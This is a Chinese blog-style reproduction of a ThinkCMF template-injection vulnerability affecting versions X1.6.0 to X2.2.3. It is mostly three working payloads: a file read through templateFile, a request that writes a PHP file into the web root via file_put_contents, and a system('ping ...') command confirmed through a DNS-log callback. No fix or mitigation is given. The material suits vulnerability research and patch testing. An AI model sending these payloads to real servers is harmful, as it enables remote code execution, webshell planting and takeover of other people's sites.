#### 简介
ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。
ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。
每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。

#### 影响版本
ThinkCMF X1.6.0
ThinkCMF X2.1.0
ThinkCMF X2.2.0
ThinkCMF X2.2.1
ThinkCMF X2.2.2
ThinkCMF X2.2.3

#### 复现环境
我这里下载的2.2.0版本，下载地址为：[thinkcmfx2.2.0](https://gitee.com/thinkcmf/ThinkCMFX/releases)

安装过程就略过了

#### 漏洞复现

##### 0x01 
payload: http://localhost/thinkcmfx220/?a=display&templateFile=README.md

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191025204617762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlX2FuZA==,size_16,color_FFFFFF,t_70)
##### 0x02
payload:?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>

上述请求发送后，会在thinkcmfx根目录生成test.php,我们访问一下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191025204929291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlX2FuZA==,size_16,color_FFFFFF,t_70)
##### 0x03
payload:?a=fetch&content=<?php system('ping xxxxxx');?>

这种方式其实利用和pyload2一样，只不过是直接执行系统命令，我们可以用dnslog的方式检验结果，如下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191025205321715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlX2FuZA==,size_16,color_FFFFFF,t_70)
说明命令成功执行